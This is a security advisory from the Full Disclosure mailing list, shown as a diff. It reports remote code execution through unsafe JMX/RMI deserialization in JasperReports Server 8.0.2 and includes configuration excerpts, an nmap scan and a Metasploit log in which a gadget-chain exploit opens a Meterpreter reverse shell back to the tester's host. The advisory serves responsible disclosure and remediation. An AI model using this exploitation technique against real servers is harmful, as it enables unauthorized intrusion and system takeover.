@@ -1,0 +1,211 @@
+
+Date: Fri, 9 Sep 2022 16:11:01 +0200
+From: Moritz Bechler <moritz.bechler@...s.de>
+To: <fulldisclosure@...lists.org>
+Subject: [FD] [SYSS-2022-041] Remote Code Execution due to unsafe JMX
+ default configuration in JasperReports Server
+
+Advisory ID:               SYSS-2022-041
+Product:                   JasperReports Server
+Manufacturer:              TIBCO Software Inc.
+Tested Version(s):         8.0.2 Community Edition
+Vulnerability Type:        CWE-502: Deserialization of Untrusted Data
+Risk Level:                High
+Solution Status:           Fixed
+Manufacturer Notification: 2022-06-10
+Solution Date:             2022-08-10
+Public Disclosure:         2022-09-09
+CVE Reference:             None assigned
+Author of Advisory:        Moritz Bechler, SySS GmbH
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+The manufacturer describes the product as follows (see [1]):
+
+"TIBCO JasperReports(R) Server is a stand-alone and embeddable
+reporting server. It provides reporting and analytics that can
+be embedded into a web or mobile application as well as operate
+as a central information hub for the enterprise by delivering
+mission critical information on a real-time or scheduled basis
+to the browser, mobile device, or email inbox in a variety of
+file formats."
+
+Due to JMX/RMI services performing unsafe deserialization, it is
+possible to execute arbitrary code and system commands on the
+server system.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details:
+
+The JasperReports Server web application spawns a non-standard JMX
+diagnostic server exposed under the RMI name "jasperserver". The relevant
+configuration is found in WEB-INF/js.diagnostic.properties:
+------
+#Diagnostic default remote access configuration
+diagnostic.usePlatformJMXServer = false
+diagnostic.port = 10990
+diagnostic.name = jasperserver
+diagnostic.rmiHost = localhost
+------
+
+It is also found in WEB-INF/applicationContext-diagnostic.xml:
+------
+<!--Bean which create Connector to JMS Servercan be disabled if not Using separate JMX Server-->
+<bean id="jasperJMXServerConnector" class="org.springframework.jmx.support.ConnectorServerFactoryBean" lazy-init="false">
+		<property name="server" ref="jasperJMXServer"/>
+		<property name="objectName" value="connector:name=rmi"/>
+		<property name="serviceUrl" value="service:jmx:rmi:///jndi/rmi://${diagnostic.rmiHost}:${diagnostic.port}/${diagnostic.name}"/>
+		<property name="environmentMap">
+				<map>
+						<entry key="jmx.remote.authenticator" value-ref="jMXAuthenticator"/>
+				</map>
+		</property>
+</bean>
+------
+
+
+While the hostname for the RMI bind is specified as localhost, this does,
+in fact, not set the bind address and both the registry and the
+(random) object port are reachable over the network. Only the returned
+reference address is broken, as it points to the local address, but
+this can be adjusted for exploitation.
+
+And while various security patches have implemented type restrictions
+for the fundamental RMI services (DGC, Registry) and the JMX authentication,
+the latter is not applied in this case. It is only active if the following
+property is set: "jmx.remote.rmi.server.credential.types".
+
+For a regular JMX server, this is configured by the standard
+library's JMX ConnectorBootstrap; however, this is not the case for the custom
+JMX server created through Spring's ConnectorServerFactoryBean.
+
+Therefore, the RMIServer.newClient endpoint performs unrestricted,
+unsafe deserialization and can be exploited using one of the known,
+published gadget chains (e.g. from ysoserial[5]) in one of the libraries
+bundled by the server. These allow for execution of arbitrary bytecode and/or
+system commands on the server.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof of Concept (PoC):
+
+JasperReports Server (CE) was installed according to the documentation[4]
+on a Debian 11 system running Tomcat 9.0.43-2~deb11u3 and OpenJDK 11.0.15.
+
+After the successful initial setup, a new RMI service can be observed on TCP
+port 10990:
+
+------
+PORT      STATE SERVICE  VERSION
+10990/tcp open  java-rmi Java RMI
+| rmi-dumpregistry:
+|   jasperserver
+|     javax.management.remote.rmi.RMIServerImpl_Stub
+|     @127.0.1.1:39297
+|     extends
+|       java.rmi.server.RemoteStub
+|       extends
+|_        java.rmi.server.RemoteObject
+------
+
+Using a custom Metasploit module, calls on the exposed RMI object can
+be made (calling JMX's RMIServer.newClient(Object creds)). The module
+is capable of identifying known exploitable types on the remote classpath
+and sending malicious crafted objects. These, when deserialized by the remote
+RMI server, spawn a Java Meterpreter instance and open a reverse shell.
+
+------
+msf6 exploit(multi/java/rmi_server) >
+[*] Started reverse TCP handler on 192.168.56.1:4444
+[*] payload/java/classfile/meterpreter/reverse_tcp
+[*] Trying bytecode execution
+[*] Found RMI Registry with 1 registered objects
+[+] Registry lookup() name argument is filtered
+[*] Bind access check before deserialization
+[*] DGC found
+[+] DGC filters parameter types
+[*] Found 1 referenced objects, following references
+[*] Custom object found jasperserver
+[*] Trying with original host 192.168.56.106 port 39297
+[*] Method/interface hash -1089742558549201240 method id -1
+[*] Initial test returned error java.lang.SecurityException
+[-] Incompatible commons-fileupload
+[*] Identified 1 attack vector(s), gadgets ["hashdos", "beanutils",
+  "hibernate", "hibernate-validator", "spring-typeprov", "spring-jta", "rhino"]
+[*] Skipping gadget hashdos based on config
+[*] Sending stage (53921 bytes) to 192.168.56.106
+[...]
+[*] Waiting for exploit to complete...
+[*] Have session...
+[*] Server stopped.
+[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.106:46828) at 2022-06-09 13:39:40 +0200
+-------
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Solution:
+
+Disable the JMX server as per documentation, as per section 9.12 of [6].
+Update to version 8.1.0 which disables the JMX service by default.
+Do not enable the Diagnostic JMX Server.
+  
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclosure Timeline:
+
+2022-06-08: Vulnerability discovered
+2022-06-10: Vulnerability reported to manufacturer
+2022-08-10: Patch released by manufacturer
+2022-09-09: Public disclosure of vulnerability
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+References:
+
+[1] Product website for JasperReports Server
+     https://community.jaspersoft.com/project/jasperreports-server
+[2] SySS Security Advisory SYSS-2022-041
+     https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2022-041.txt
+[3] SySS Responsible Disclosure Policy
+     https://www.syss.de/en/responsible-disclosure-policy
+[4] TIBCO JasperReports Server Community Edition Release Notes
+     https://community.jaspersoft.com/documentation/tibco-jasperreports-server-community-edition-release-notes/v750/installation-and-basic
+[5] ysoserial
+     https://github.com/frohoff/ysoserial/
+[6] JasperReports Server Administrator Guide
+     https://docs.tibco.com/pub/js-jrs/8.0.2/doc/pdf/TIB_js-jrs_8.0.0_Admin-Guide.pdf?id=5
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Credits:
+
+This security vulnerability was found by Moritz Bechler of SySS GmbH.
+
+E-Mail: moritz.bechler@...s.de
+Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Moritz_Bechler.asc
+Key ID: 0x768EFE2BB3E53DDA
+Key Fingerprint: 2C8F F101 9D77 BDE6 465E  CCC2 768E FE2B B3E5 3DDA
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclaimer:
+
+The information provided in this security advisory is provided "as is"
+and without warranty of any kind. Details of this security advisory may
+be updated in order to provide as accurate information as possible. The
+latest version of this security advisory is available on the SySS website.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Copyright:
+
+Creative Commons - Attribution (by) - Version 3.0
+URL: http://creativecommons.org/licenses/by/3.0/deed.en
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: https://seclists.org/fulldisclosure/
